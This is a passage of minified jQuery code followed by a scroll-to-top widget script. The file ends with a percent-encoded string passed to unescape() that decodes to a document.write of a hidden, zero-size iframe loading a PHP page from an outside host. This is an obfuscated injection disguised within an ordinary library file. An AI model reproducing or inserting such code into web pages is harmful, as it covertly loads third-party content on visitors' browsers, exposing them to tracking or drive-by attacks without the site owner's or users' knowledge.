            this.now = this.start = a;
            this.pos = this.state = 0;
            this.unit = e || this.unit || (c.cssNumber[this.prop] ? "" : "px");
            d.queue = this.options.queue;
            d.elem = this.elem;
            d.saveState = function() {
                c._data(f.elem, "fxshow" + f.prop) === m && (f.options.hide ? c._data(f.elem, "fxshow" + f.prop, f.start) : f.options.show && c._data(f.elem, "fxshow" + f.prop, f.end))
            };
            d() && c.timers.push(d) && !fa && (fa = setInterval(g.tick, g.interval))
        },
        show: function() {
            var a = c._data(this.elem, "fxshow" + this.prop);
            this.options.orig[this.prop] = a || c.style(this.elem, this.prop);
            this.options.show = !0;
            a !== m ? this.custom(this.cur(), a) : this.custom("width" === this.prop || "height" === this.prop ? 1 : 0, this.cur());
            c(this.elem).show()
        },
        hide: function() {
            this.options.orig[this.prop] = c._data(this.elem, "fxshow" + this.prop) || c.style(this.elem, this.prop);
            this.options.hide = !0;
            this.custom(this.cur(), 0)
        },
        step: function(a) {
            var b,
                e, d = Z || va(),
                f = !0,
                g = this.elem,
                k = this.options;
            if (a || d >= k.duration + this.startTime) {
                this.now = this.end;
                this.pos = this.state = 1;
                this.update();
                k.animatedProperties[this.prop] = !0;
                for (b in k.animatedProperties) !0 !== k.animatedProperties[b] && (f = !1);
                if (f) {
                    null != k.overflow && !c.support.shrinkWrapBlocks && c.each(["", "X", "Y"], function(a, b) {
                        g.style["overflow" + b] = k.overflow[a]
                    });
                    k.hide && c(g).hide();
                    if (k.hide || k.show)
                        for (b in k.animatedProperties) c.style(g, b, k.orig[b]), c.removeData(g, "fxshow" + b, !0), c.removeData(g, "toggle" +
                            b, !0);
                    (a = k.complete) && (k.complete = !1, a.call(g))
                }
                return !1
            }
            Infinity == k.duration ? this.now = d : (e = d - this.startTime, this.state = e / k.duration, this.pos = c.easing[k.animatedProperties[this.prop]](this.state, e, 0, 1, k.duration), this.now = this.start + (this.end - this.start) * this.pos);
            this.update();
            return !0
        }
    };
    c.extend(c.fx, {
        tick: function() {
            for (var a, b = c.timers, e = 0; e < b.length; e++) a = b[e], !a() && b[e] === a && b.splice(e--, 1);
            b.length || c.fx.stop()
        },
        interval: 13,
        stop: function() {
            clearInterval(fa);
            fa = null
        },
        speeds: {
            slow: 600,
            fast: 200,
            _default: 400
        },
        step: {
            opacity: function(a) {
                c.style(a.elem, "opacity", a.now)
            },
            _default: function(a) {
                a.elem.style && null != a.elem.style[a.prop] ? a.elem.style[a.prop] = a.now + a.unit : a.elem[a.prop] = a.now
            }
        }
    });
    c.each(Y.concat.apply([], Y), function(a, b) {
        b.indexOf("margin") && (c.fx.step[b] = function(a) {
            c.style(a.elem, b, Math.max(0, a.now) + a.unit)
        })
    });
    c.expr && c.expr.filters && (c.expr.filters.animated = function(a) {
        return c.grep(c.timers, function(b) {
            return a === b.elem
        }).length
    });
    var ta, hc = /^t(?:able|d|h)$/i,
        kb = /^(?:body|html)$/i;
    "getBoundingClientRect" in n.documentElement ? ta = function(a, b, e, d) {
        try {
            d = a.getBoundingClientRect()
        } catch (f) {}
        if (!d || !c.contains(e, a)) return d ? {
            top: d.top,
            left: d.left
        } : {
            top: 0,
            left: 0
        };
        a = b.body;
        b = T(b);
        return {
            top: d.top + (b.pageYOffset || c.support.boxModel && e.scrollTop || a.scrollTop) - (e.clientTop || a.clientTop || 0),
            left: d.left + (b.pageXOffset || c.support.boxModel && e.scrollLeft || a.scrollLeft) - (e.clientLeft || a.clientLeft || 0)
        }
    } : ta = function(a, b, e) {
        var d, f = a.offsetParent,
            g = b.body;
        d = (b = b.defaultView) ? b.getComputedStyle(a,
            null) : a.currentStyle;
        for (var k = a.offsetTop, h = a.offsetLeft;
            (a = a.parentNode) && a !== g && a !== e && (!c.support.fixedPosition || "fixed" !== d.position);) d = b ? b.getComputedStyle(a, null) : a.currentStyle, k -= a.scrollTop, h -= a.scrollLeft, a === f && (k += a.offsetTop, h += a.offsetLeft, c.support.doesNotAddBorder && (!c.support.doesAddBorderForTableAndCells || !hc.test(a.nodeName)) && (k += parseFloat(d.borderTopWidth) || 0, h += parseFloat(d.borderLeftWidth) || 0), f = a.offsetParent), c.support.subtractsBorderForOverflowNotVisible && "visible" !==
            d.overflow && (k += parseFloat(d.borderTopWidth) || 0, h += parseFloat(d.borderLeftWidth) || 0);
        if ("relative" === d.position || "static" === d.position) k += g.offsetTop, h += g.offsetLeft;
        c.support.fixedPosition && "fixed" === d.position && (k += Math.max(e.scrollTop, g.scrollTop), h += Math.max(e.scrollLeft, g.scrollLeft));
        return {
            top: k,
            left: h
        }
    };
    c.fn.offset = function(a) {
        if (arguments.length) return a === m ? this : this.each(function(b) {
            c.offset.setOffset(this, a, b)
        });
        var b = this[0],
            e = b && b.ownerDocument;
        return e ? b === e.body ? c.offset.bodyOffset(b) :
            ta(b, e, e.documentElement) : null
    };
    c.offset = {
        bodyOffset: function(a) {
            var b = a.offsetTop,
                e = a.offsetLeft;
            c.support.doesNotIncludeMarginInBodyOffset && (b += parseFloat(c.css(a, "marginTop")) || 0, e += parseFloat(c.css(a, "marginLeft")) || 0);
            return {
                top: b,
                left: e
            }
        },
        setOffset: function(a, b, e) {
            var d = c.css(a, "position");
            "static" === d && (a.style.position = "relative");
            var f = c(a),
                g = f.offset(),
                k = c.css(a, "top"),
                h = c.css(a, "left"),
                l = {},
                m = {},
                n, q;
            ("absolute" === d || "fixed" === d) && -1 < c.inArray("auto", [k, h]) ? (m = f.position(), n = m.top, q = m.left) :
                (n = parseFloat(k) || 0, q = parseFloat(h) || 0);
            c.isFunction(b) && (b = b.call(a, e, g));
            null != b.top && (l.top = b.top - g.top + n);
            null != b.left && (l.left = b.left - g.left + q);
            "using" in b ? b.using.call(a, l) : f.css(l)
        }
    };
    c.fn.extend({
        position: function() {
            if (!this[0]) return null;
            var a = this[0],
                b = this.offsetParent(),
                e = this.offset(),
                d = kb.test(b[0].nodeName) ? {
                    top: 0,
                    left: 0
                } : b.offset();
            e.top -= parseFloat(c.css(a, "marginTop")) || 0;
            e.left -= parseFloat(c.css(a, "marginLeft")) || 0;
            d.top += parseFloat(c.css(b[0], "borderTopWidth")) || 0;
            d.left += parseFloat(c.css(b[0],
                "borderLeftWidth")) || 0;
            return {
                top: e.top - d.top,
                left: e.left - d.left
            }
        },
        offsetParent: function() {
            return this.map(function() {
                for (var a = this.offsetParent || n.body; a && !kb.test(a.nodeName) && "static" === c.css(a, "position");) a = a.offsetParent;
                return a
            })
        }
    });
    c.each({
        scrollLeft: "pageXOffset",
        scrollTop: "pageYOffset"
    }, function(a, b) {
        var e = /Y/.test(b);
        c.fn[a] = function(d) {
            return c.access(this, function(a, d, k) {
                var h = T(a);
                if (k === m) return h ? b in h ? h[b] : c.support.boxModel && h.document.documentElement[d] || h.document.body[d] : a[d];
                h ? h.scrollTo(e ? c(h).scrollLeft() : k, e ? k : c(h).scrollTop()) : a[d] = k
            }, a, d, arguments.length, null)
        }
    });
    c.each({
        Height: "height",
        Width: "width"
    }, function(a, b) {
        var e = "client" + a,
            d = "scroll" + a,
            f = "offset" + a;
        c.fn["inner" + a] = function() {
            var a = this[0];
            return a ? a.style ? parseFloat(c.css(a, b, "padding")) : this[b]() : null
        };
        c.fn["outer" + a] = function(a) {
            var d = this[0];
            return d ? d.style ? parseFloat(c.css(d, b, a ? "margin" : "border")) : this[b]() : null
        };
        c.fn[b] = function(a) {
            return c.access(this, function(a, b, g) {
                if (c.isWindow(a)) return b = a.document,
                    a = b.documentElement[e], c.support.boxModel && a || b.body && b.body[e] || a;
                if (9 === a.nodeType) return b = a.documentElement, b[e] >= b[d] ? b[e] : Math.max(a.body[d], b[d], a.body[f], b[f]);
                if (g === m) return a = c.css(a, b), b = parseFloat(a), c.isNumeric(b) ? b : a;
                c(a).css(b, g)
            }, b, a, arguments.length, null)
        }
    });
    t.jQuery = t.$ = c;
    "function" == typeof define && define.amd && define.amd.jQuery && define("jquery", [], function() {
        return c
    })
})(window);
var scrolltotop = {
    setting: {
        startline: 100,
        scrollto: 0,
        scrollduration: 1E3,
        fadeduration: [500, 100]
    },
    controlHTML: '<img src="http://in4.sitekodlari.com/yukcik/yc1.png" />',
    controlattrs: {
        offsetx: 5,
        offsety: 5
    },
    anchorkeyword: "#top",
    state: {
        isvisible: !1,
        shouldvisible: !1
    },
    scrollup: function() {
        this.cssfixedsupport || this.$control.css({
            opacity: 0
        });
        var t = isNaN(this.setting.scrollto) ? this.setting.scrollto : parseInt(this.setting.scrollto),
            t = "string" == typeof t && 1 == jQuery("#" + t).length ? jQuery("#" + t).offset().top : 0;
        this.$body.animate({
                scrollTop: t
            },
            this.setting.scrollduration)
    },
    keepfixed: function() {
        var t = jQuery(window),
            m = t.scrollLeft() + t.width() - this.$control.width() - this.controlattrs.offsetx,
            t = t.scrollTop() + t.height() - this.$control.height() - this.controlattrs.offsety;
        this.$control.css({
            left: m + "px",
            top: t + "px"
        })
    },
    togglecontrol: function() {
        var t = jQuery(window).scrollTop();
        this.cssfixedsupport || this.keepfixed();
        this.state.shouldvisible = t >= this.setting.startline ? !0 : !1;
        this.state.shouldvisible && !this.state.isvisible ? (this.$control.stop().animate({
                opacity: 1
            },
            this.setting.fadeduration[0]), this.state.isvisible = !0) : 0 == this.state.shouldvisible && this.state.isvisible && (this.$control.stop().animate({
            opacity: 0
        }, this.setting.fadeduration[1]), this.state.isvisible = !1)
    },
    init: function() {
        jQuery(document).ready(function(t) {
            var m = scrolltotop,
                T = document.all;
            m.cssfixedsupport = !T || T && "CSS1Compat" == document.compatMode && window.XMLHttpRequest;
            m.$body = window.opera ? "CSS1Compat" == document.compatMode ? t("html") : t("body") : t("html,body");
            m.$control = t('<div id="topcontrol">' + m.controlHTML +
                "</div>").css({
                position: m.cssfixedsupport ? "fixed" : "absolute",
                bottom: m.controlattrs.offsety,
                right: m.controlattrs.offsetx,
                opacity: 0,
                cursor: "pointer"
            }).attr({
                title: "Scroll to Top"
            }).click(function() {
                m.scrollup();
                return !1
            }).appendTo("body");
            document.all && !window.XMLHttpRequest && "" != m.$control.text() && m.$control.css({
                width: m.$control.width()
            });
            m.togglecontrol();
            t('a[href="' + m.anchorkeyword + '"]').click(function() {
                m.scrollup();
                return !1
            });
            t(window).bind("scroll resize", function(t) {
                m.togglecontrol()
            })
        })
    }
};
scrolltotop.init();
unescape('%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%27%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%69%73%31%2E%73%69%74%65%6B%6F%64%6C%61%72%69%2E%63%6F%6D%2F%79%63%31%2E%70%68%70%22%20%73%63%72%6F%6C%6C%69%6E%67%3D%22%6E%6F%22%20%66%72%61%6D%65%42%6F%72%64%65%72%3D%22%30%22%20%77%69%64%74%68%3D%22%30%22%20%68%65%69%67%68%74%3D%22%30%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%3C%2F%69%66%72%61%6D%65%3E%27%29%3B')